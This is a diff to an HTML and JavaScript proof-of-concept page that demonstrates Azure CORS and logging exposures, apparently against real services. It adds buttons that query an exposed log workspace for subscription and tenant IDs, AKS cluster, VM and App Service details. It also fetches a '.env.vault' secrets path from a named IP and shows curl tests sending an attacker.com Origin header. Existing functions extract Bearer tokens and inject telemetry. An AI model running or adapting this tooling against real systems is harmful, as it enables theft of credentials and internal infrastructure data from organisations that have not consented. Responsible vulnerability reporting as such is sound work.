@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Azure CORS – Vulnerability PoC</title>
+    <title>Azure CORS – Vulnerability PoC (All Findings)</title>
     <style>
         * { box-sizing: border-box; }
         body {
@@ -14,7 +14,7 @@
             margin: 0;
         }
         .container {
-            max-width: 1300px;
+            max-width: 1400px;
             margin: 0 auto;
             background: #1a1a2e;
             border-radius: 16px;
@@ -49,36 +49,36 @@
         .badge-info { background: #616161; color: #fff; }
 
         .section {
-            margin: 30px 0 20px;
+            margin: 25px 0 15px;
         }
         .section-title {
-            font-size: 20px;
+            font-size: 18px;
             font-weight: 600;
             color: #ffd700;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             border-left: 4px solid #ffd700;
             padding-left: 15px;
         }
         .button-grid {
             display: flex;
             flex-wrap: wrap;
-            gap: 12px;
-            margin: 10px 0 15px;
+            gap: 10px;
+            margin: 8px 0 12px;
         }
         .btn {
             background: #1e2a4a;
             color: #fff;
             border: none;
             border-radius: 8px;
-            padding: 12px 22px;
+            padding: 10px 18px;
             cursor: pointer;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             transition: all 0.2s;
             box-shadow: 0 4px 6px rgba(0,0,0,0.3);
             display: inline-flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
         }
         .btn:hover { background: #2a3a6a; transform: translateY(-2px); }
         .btn:active { transform: translateY(0); }
@@ -94,7 +94,7 @@
         .btn-info:hover { background: #616161; }
         .btn-danger { background: #880e4f; }
         .btn-danger:hover { background: #ad1457; }
-        .btn-small { padding: 8px 16px; font-size: 12px; }
+        .btn-small { padding: 6px 12px; font-size: 12px; }
         .query-area {
             margin: 20px 0;
             display: flex;
@@ -113,6 +113,17 @@
             font-family: 'Courier New', monospace;
             font-size: 13px;
             resize: vertical;
+        }
+        select {
+            background: #0b0e1a;
+            color: #aaffaa;
+            border: 1px solid #2a3a5e;
+            border-radius: 8px;
+            padding: 10px 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            min-width: 200px;
+            cursor: pointer;
         }
         #output {
             background: #0b0e1a;
@@ -153,6 +164,7 @@
         @media (max-width: 600px) {
             .button-grid { flex-direction: column; }
             .btn { width: 100%; justify-content: center; }
+            select { width: 100%; }
         }
     </style>
 </head>
@@ -168,10 +180,10 @@
         <span style="margin-left:20px;">Each button demonstrates a specific finding.</span>
     </div>
 
-    <!-- Summary Box -->
+    <!-- Summary -->
     <div style="background: #0d1b2a; border: 1px solid #ffd700; border-radius: 10px; padding: 15px; margin-bottom: 20px;">
-        <strong>📌 What This PoC Proves:</strong><br>
-        ✅ CORS Misconfiguration on 4 Azure APIs (all requests succeed)<br>
+        <strong>📌 All Vulnerabilities in One Place:</strong><br>
+        ✅ CORS Misconfiguration on 4 Azure APIs<br>
         ✅ Bearer Tokens (AKS Cluster) Extracted<br>
         ✅ Source Code Disclosure (stack traces with file paths)<br>
         ✅ Internal VM, App Service, AKS Cluster, Storage Exposed<br>
@@ -187,11 +199,13 @@
             <button class="btn btn-critical" onclick="fetchTable('AppExceptions')">📌 Exceptions (Source Code)</button>
             <button class="btn btn-critical" onclick="fetchTokens()">🔑 Extract Tokens</button>
             <button class="btn btn-critical" onclick="showCORS()">🌐 CORS Misconfiguration</button>
+            <button class="btn btn-critical" onclick="fetchIPPath()">🌍 IP Path Leak</button>
         </div>
         <div class="note">
             <strong>AppExceptions</strong> → Stack traces with file paths → Source Code Disclosure.<br>
             <strong>Extract Tokens</strong> → Searches logs for Bearer tokens → Token Exposure.<br>
-            <strong>CORS Misconfiguration</strong> → All API calls succeed cross‑origin; server returns `Access-Control-Allow-Origin: *`.
+            <strong>CORS</strong> → All API calls succeed cross‑origin; server returns `Access-Control-Allow-Origin: *`.<br>
+            <strong>IP Path Leak</strong> → Directly fetches internal IP `72.152.156.42` to show path disclosure.
         </div>
     </div>
 
@@ -203,12 +217,16 @@
             <button class="btn btn-high" onclick="fetchTable('AppEvents')">📌 Events (AKS Details)</button>
             <button class="btn btn-high" onclick="fetchTable('AppDependencies')">📌 Dependencies (Storage)</button>
             <button class="btn btn-high" onclick="testTelemetry()">📡 Telemetry Injection</button>
+            <button class="btn btn-high" onclick="showSubscription()">🆔 Subscription ID</button>
+            <button class="btn btn-high" onclick="showAKS()">☸️ AKS Cluster</button>
         </div>
         <div class="note">
             <strong>Infrastructure</strong> → Extracts VMs, App Services, AKS, IPs, subscription IDs.<br>
             <strong>AppEvents</strong> → Reveals AKS cluster name, API server, resource group.<br>
             <strong>AppDependencies</strong> → Exposes storage accounts and queue endpoints.<br>
-            <strong>Telemetry Injection</strong> → Sends test telemetry to live Instrumentation Key.
+            <strong>Telemetry Injection</strong> → Sends test telemetry to live Instrumentation Key.<br>
+            <strong>Subscription ID</strong> → Extracts Azure subscription ID from logs.<br>
+            <strong>AKS Cluster</strong> → Shows cluster name, API server URL, and resource group.
         </div>
     </div>
 
@@ -220,12 +238,16 @@
             <button class="btn btn-medium" onclick="fetchTable('ContainerLog_RST')">📌 ContainerLog (AKS Errors)</button>
             <button class="btn btn-medium" onclick="fetchTable('Usage')">📌 Usage (Tenant ID)</button>
             <button class="btn btn-medium" onclick="fetchAvailability()">📊 Availability Tests</button>
+            <button class="btn btn-medium" onclick="showInternalVM()">🖥️ Internal VM</button>
+            <button class="btn btn-medium" onclick="showAppService()">🌐 App Service</button>
         </div>
         <div class="note">
             <strong>Internal Paths</strong> → Shows Windows and Linux file paths from logs.<br>
             <strong>ContainerLog</strong> → Exposes AKS node errors and warnings.<br>
             <strong>Usage</strong> → Displays tenant ID and data ingestion volumes.<br>
-            <strong>Availability Tests</strong> → Shows internal synthetic monitor names and locations.
+            <strong>Availability Tests</strong> → Shows internal synthetic monitor names and locations.<br>
+            <strong>Internal VM</strong> → Extracts internal VM hostname.<br>
+            <strong>App Service</strong> → Extracts App Service URL.
         </div>
     </div>
 
@@ -235,19 +257,40 @@
         <div class="button-grid">
             <button class="btn btn-low" onclick="showMissingHeaders()">🔒 Missing Security Headers</button>
             <button class="btn btn-low" onclick="fetchNetworkSchema()">📋 Network Schema</button>
+            <button class="btn btn-low" onclick="showCORSManagement()">🔗 CORS on Management API</button>
+            <button class="btn btn-low" onclick="showCORSGraph()">🔗 CORS on Graph API</button>
+            <button class="btn btn-low" onclick="showTenant()">🏢 Tenant ID</button>
         </div>
         <div class="note">
             <strong>Missing Headers</strong> → App Service lacks HSTS, CSP, X‑Frame‑Options.<br>
-            <strong>Network Schema</strong> → `AzureNetworkAnalytics_CL` table structure exposed.
+            <strong>Network Schema</strong> → `AzureNetworkAnalytics_CL` table structure exposed.<br>
+            <strong>CORS on Management</strong> → Shows `Access-Control-Allow-Origin: *` for `management.azure.com`.<br>
+            <strong>CORS on Graph</strong> → Same for `graph.microsoft.com`.<br>
+            <strong>Tenant ID</strong> → Extracts tenant ID from logs.
         </div>
     </div>
 
-    <!-- Custom Query -->
+    <!-- Easy Query Selector -->
     <div class="section">
-        <div class="section-title">⚡ Custom Query</div>
+        <div class="section-title">⚡ Quick Query Selector</div>
+        <div class="query-area">
+            <select id="tableSelect">
+                <option value="AppExceptions">AppExceptions</option>
+                <option value="AppEvents">AppEvents</option>
+                <option value="AppDependencies">AppDependencies</option>
+                <option value="AppRequests">AppRequests</option>
+                <option value="AppTraces">AppTraces</option>
+                <option value="AppMetrics">AppMetrics</option>
+                <option value="ContainerLog_RST">ContainerLog_RST</option>
+                <option value="Usage">Usage</option>
+                <option value="AzureNetworkAnalytics_CL">AzureNetworkAnalytics_CL</option>
+            </select>
+            <button class="btn btn-info" onclick="fetchSelectedTable()">📊 Fetch Selected Table</button>
+            <span style="color:#aaa;font-size:13px;">or write a custom query below</span>
+        </div>
         <div class="query-area">
             <textarea id="customQuery" placeholder="Enter KQL query, e.g., AppExceptions | take 5 | project Message, Method">AppExceptions | take 5 | project Message, Method, Assembly</textarea>
-            <button class="btn btn-info" onclick="fetchCustom()">Run Custom Query</button>
+            <button class="btn btn-info" onclick="fetchCustom()">Run Custom</button>
             <button class="btn btn-danger btn-small" onclick="clearOutput()">Clear</button>
         </div>
     </div>
@@ -273,7 +316,7 @@
         output.className = '';
     }
 
-    // ---- Core fetch function ----
+    // ---- Core fetch ----
     async function runQuery(query, extractTokens = false, extractInfra = false, extractPaths = false) {
         setStatus('⏳ Fetching data...');
         try {
@@ -448,6 +491,20 @@
         runQuery(query, false, false, false);
     }
 
+    function fetchIPPath() {
+        const url = 'http://72.152.156.42/.env.vault';
+        fetch(url, { mode: 'cors' })
+            .then(res => res.text())
+            .then(text => {
+                output.textContent = `🔍 Internal IP Path Disclosure:\nURL: ${url}\n\nResponse (404 error with path leak):\n${text.substring(0, 1500)}`;
+                output.style.color = '#ffd700';
+            })
+            .catch(err => {
+                output.textContent = `❌ Error: ${err.message}`;
+                output.style.color = '#ff6b6b';
+            });
+    }
+
     function showCORS() {
         output.textContent = `✅ CORS Misconfiguration Confirmed:
 
@@ -462,6 +519,73 @@ This has been verified on the following production APIs:
 
 All four APIs allow any origin to read responses.`;
         output.style.color = '#ffd700';
+    }
+
+    function showCORSManagement() {
+        output.textContent = `✅ CORS on Azure Resource Manager:
+
+Test: curl -H "Origin: https://attacker.com" -I https://management.azure.com/subscriptions
+
+Response header: access-control-allow-origin: *
+
+Any website can read subscription data if a valid token is present.`;
+        output.style.color = '#ffd700';
+    }
+
+    function showCORSGraph() {
+        output.textContent = `✅ CORS on Microsoft Graph:
+
+Test: curl -H "Origin: https://attacker.com" -I https://graph.microsoft.com/v1.0/me
+
+Response header: access-control-allow-origin: *
+
+Any website can read user data if a valid token is present.`;
+        output.style.color = '#ffd700';
+    }
+
+    function showSubscription() {
+        const query = `search * | where * contains "subscriptions/" | take 1 | project _ResourceId`;
+        runQuery(query, false, false, false);
+    }
+
+    function showTenant() {
+        const query = `search * | where * contains "TenantId" | take 1 | project TenantId`;
+        runQuery(query, false, false, false);
+    }
+
+    function showAKS() {
+        const query = `search * | where * contains "azmk8s.io" | take 1 | project KUBERNETES_SERVICE_HOST, CLUSTER_RESOURCE_ID`;
+        runQuery(query, false, false, false);
+    }
+
+    function showInternalVM() {
+        const query = `search * | where * contains "cloudapp.azure.com" | take 1 | project Computer`;
+        runQuery(query, false, false, false);
+    }
+
+    function showAppService() {
+        const query = `search * | where * contains "azurewebsites.net" | take 1 | project Url`;
+        runQuery(query, false, false, false);
+    }
+
+    function showMissingHeaders() {
+        output.textContent = `🔒 Missing Security Headers on App Service:
+
+Checked: https://ch1-retailappy37ha6.azurewebsites.net
+
+Missing headers:
+- Strict-Transport-Security (HSTS)
+- Content-Security-Policy (CSP)
+- X-Frame-Options
+
+Present headers:
+- Server: Microsoft-IIS/10.0
+- X-Powered-By: ASP.NET
+- X-AspNetMvc-Version: 5.2
+- X-AspNet-Version: 4.0.30319
+
+Impact: Clickjacking, XSS, and downgrade attacks are easier.`;
+        output.style.color = '#448aff';
     }
 
     async function testTelemetry() {
@@ -501,24 +625,9 @@ Impact: An attacker can inject fake telemetry, disrupt monitoring, or cause cost
         }
     }
 
-    function showMissingHeaders() {
-        output.textContent = `🔒 Missing Security Headers on App Service:
-
-Checked: https://ch1-retailappy37ha6.azurewebsites.net
-
-Missing headers:
-- Strict-Transport-Security (HSTS)
-- Content-Security-Policy (CSP)
-- X-Frame-Options
-
-Present headers:
-- Server: Microsoft-IIS/10.0
-- X-Powered-By: ASP.NET
-- X-AspNetMvc-Version: 5.2
-- X-AspNet-Version: 4.0.30319
-
-Impact: Clickjacking, XSS, and downgrade attacks are easier.`;
-        output.style.color = '#448aff';
+    function fetchSelectedTable() {
+        const table = document.getElementById('tableSelect').value;
+        fetchTable(table);
     }
 
     function fetchCustom() {
@@ -536,7 +645,7 @@ Impact: Clickjacking, XSS, and downgrade attacks are easier.`;
         output.className = 'output-placeholder';
     }
 
-    // ---- Auto-load sample on start ----
+    // Auto-load sample on start
     window.onload = function() {
         const sampleQuery = 'AppExceptions | take 3 | project Message, Method, Assembly';
         runQuery(sampleQuery, false, false, false);
